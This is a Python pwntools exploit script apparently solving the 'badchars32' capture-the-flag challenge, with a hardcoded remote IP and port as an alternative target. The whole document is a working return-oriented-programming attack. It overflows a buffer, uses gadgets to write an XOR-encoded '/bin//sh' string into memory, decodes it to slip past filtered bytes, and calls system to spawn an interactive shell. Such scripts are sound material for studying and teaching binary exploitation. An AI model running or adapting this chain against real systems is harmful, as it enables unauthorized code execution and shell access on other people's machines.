#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context.arch = 'i386'

local = 1

if local:
	cn = process('./badchars32')
	# bin = ELF('./task_shoppingCart',checksec=False)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	# libc = ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False)

else:
	cn = remote('117.78.27.105', 30403)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	pass


def z(a=''):
	if local:
		gdb.attach(cn,a)
		if a == '':
			raw_input()

pop_ebx_ecx = 0x08048896 # pop ebx; pop ecx; ret;
xor_ebx_ecx = 0x08048890 # xor byte ptr [ebx], cl; ret;

mov_edi_esi = 0x08048893 # mov dword ptr [edi], esi; ret;
pop_edi_esi = 0x08048899 # pop esi; pop edi; ret;

xor_encode = 0x21
system_add = 0x080484E0

segment_add = 0x0804A040
bin_sh = '/bin//sh'
encode_str = ''

for i in bin_sh:
	encode_str += chr(ord(i)^xor_encode)

print encode_str

# z('b*0x080487A7\nc')

payload = 'A'*0x28+ 'BBBB'
payload += p32(pop_edi_esi)
payload += encode_str[:4]
payload += p32(segment_add) + p32(mov_edi_esi)
payload += p32(pop_edi_esi) + encode_str[4:8] + p32(segment_add+4) + p32(mov_edi_esi)

for i in xrange(8):
	payload += p32(pop_ebx_ecx) + p32(segment_add + i) + p32(0x21) + p32(xor_ebx_ecx)

payload += p32(system_add) + p32(0) + p32(segment_add)
cn.send(payload)

cn.interactive()
